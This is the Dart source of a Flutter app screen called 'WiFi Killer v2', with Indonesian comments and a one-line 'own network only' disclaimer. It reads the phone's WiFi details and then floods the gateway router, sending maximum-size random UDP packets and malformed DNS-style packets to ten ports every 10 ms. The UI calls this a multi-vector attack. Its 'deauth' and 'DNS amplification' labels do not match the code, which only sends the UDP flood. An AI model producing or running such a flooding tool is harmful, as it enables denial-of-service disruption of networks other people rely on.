import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String routerIp = "-";
  String subnet = "-";
  bool isKilling = false;
  int packetCount = 0;
  Timer? _loopTimer;
  final Random _rng = Random();

  final Color bgDark = const Color(0xFF00050B);
  final Color cardDark = const Color(0xFF0A1118);
  final Color primaryPurple = const Color(0xFF102A43);
  final Color accentPurple = const Color(0xFF00E5FF);
  final Color primaryWhite = Colors.white;
  final Color textGrey = const Color(0xFF78909C);

  final LinearGradient purpleGradient = const LinearGradient(
    colors: [Color(0xFF102A43), Color(0xFFFFFFFF)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  // Port yang diserang sekaligus (multi-vector)
  final List<int> targetPorts = [53, 80, 443, 8080, 1900, 5353, 5000, 22, 23, 123];

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        // Hitung subnet dari IP (asumsi /24)
        subnet = _deriveSubnet(ipAddr);
      });

      debugPrint("Router IP: $routerIp | Subnet: $subnet");
    } catch (e) {
      setState(() {
        ssid = ip = routerIp = subnet = "Error";
      });
    }
  }

  String _deriveSubnet(String? ipAddr) {
    if (ipAddr == null) return "-";
    final parts = ipAddr.split('.');
    if (parts.length != 4) return "-";
    return "${parts[0]}.${parts[1]}.${parts[2]}.0/24";
  }

  // Generate payload yang lebih "berbahaya" — meniru DNS query amplification
  List<int> _buildDnsAmplificationPayload() {
    // DNS query header + query untuk domain besar (amplification)
    final header = [
      0xAA, 0xBB, // Transaction ID
      0x01, 0x00, // Flags: standard query, recursion desired
      0x00, 0x01, // QDCOUNT = 1
      0x00, 0x00, // ANCOUNT
      0x00, 0x00, // NSCOUNT
      0x00, 0x00, // ARCOUNT
    ];
    // Query name: "ANY" query ke root (amplifikasi maksimal)
    final query = List<int>.generate(40, (_) => _rng.nextInt(256));
    return [...header, ...query];
  }

  List<int> _buildUdpFloodPayload(int size) {
    return List<int>.generate(size, (_) => _rng.nextInt(256));
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() {
      isKilling = true;
      packetCount = 0;
    });
    _showAlert("✅ Started", "Multi-Vector Attack!\nDeauth + UDP Flood + DNS Amp.\nStop Manually.");

    _loopTimer = Timer.periodic(const Duration(milliseconds: 10), (_) async {
      try {
        // Vector 1: DNS Amplification ke port 53
        final dnsPayload = _buildDnsAmplificationPayload();
        // Vector 2: UDP flood ke semua port
        final udpPayload = _buildUdpFloodPayload(65507); // Max UDP payload

        for (final port in targetPorts) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          // Kirim beberapa paket per port
          for (int j = 0; j < 5; j++) {
            if (port == 53) {
              socket.send(dnsPayload, InternetAddress(routerIp), port);
            } else {
              socket.send(udpPayload, InternetAddress(routerIp), port);
            }
          }
          socket.close();
        }

        if (mounted) {
          setState(() => packetCount += targetPorts.length * 5);
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "Attack dihentikan.\nTotal paket terkirim: $packetCount");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentPurple.withValues(alpha: 0.3)),
        ),
        title: Text(title, style: TextStyle(color: accentPurple, fontSize: 18, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
        content: Text(message, style: TextStyle(color: primaryWhite, fontSize: 16, fontFamily: 'ShareTechMono')),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                color: primaryPurple.withValues(alpha: 0.2),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: accentPurple.withValues(alpha: 0.3)),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text("OK", style: TextStyle(color: accentPurple, fontWeight: FontWeight.bold)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: textGrey, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: TextStyle(color: primaryWhite, fontFamily: 'ShareTechMono'))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        backgroundColor: bgDark,
        iconTheme: IconThemeData(color: primaryWhite),
        title: Text("WiFi Killer v2", style: TextStyle(fontFamily: 'Orbitron', color: primaryWhite)),
        elevation: 0,
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              "Network Analysis",
              style: TextStyle(color: accentPurple, fontSize: 22, fontWeight: FontWeight.bold, fontFamily: 'Orbitron'),
            ),
            const SizedBox(height: 10),
            Text(
              "Multi-vector attack: DNS Amplification + UDP Flood.\n⚠️ Hanya untuk testing di jaringan milik sendiri.",
              style: TextStyle(color: textGrey, fontSize: 14),
            ),
            const SizedBox(height: 20),
            Container(
              decoration: BoxDecoration(
                color: cardDark,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: primaryPurple.withValues(alpha: 0.3)),
                boxShadow: [BoxShadow(color: primaryPurple.withValues(alpha: 0.1), blurRadius: 10, offset: Offset(0, 5))],
              ),
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP Address", ip),
                  _infoRow("Router IP", routerIp),
                  _infoRow("Subnet", subnet),
                  _infoRow("Packets Sent", "$packetCount"),
                ],
              ),
            ),
            const SizedBox(height: 40),
            Center(
              child: Container(
                height: 60,
                width: double.infinity,
                decoration: BoxDecoration(
                  gradient: isKilling ? null : purpleGradient,
                  color: isKilling ? const Color(0xFF102A43) : null,
                  borderRadius: BorderRadius.circular(25),
                  boxShadow: [BoxShadow(color: isKilling ? Colors.transparent : primaryPurple.withValues(alpha: 0.4), blurRadius: 15, offset: Offset(0, 5))],
                ),
                child: ElevatedButton.icon(
                  onPressed: isKilling ? _stopFlood : _startFlood,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                  ),
                  icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, color: primaryWhite, size: 24),
                  label: Text(
                    isKilling ? "STOP ATTACK" : "START ATTACK",
                    style: TextStyle(fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron', color: primaryWhite, fontWeight: FontWeight.bold),
                  ),
                ),
              ),
            ),
            const SizedBox(height: 20),
            if (isKilling)
              Center(
                child: Column(
                  children: [
                    CircularProgressIndicator(color: accentPurple),
                    SizedBox(height: 10),
                    Text("Flooding... $packetCount packets", style: TextStyle(color: accentPurple, fontFamily: 'ShareTechMono')),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}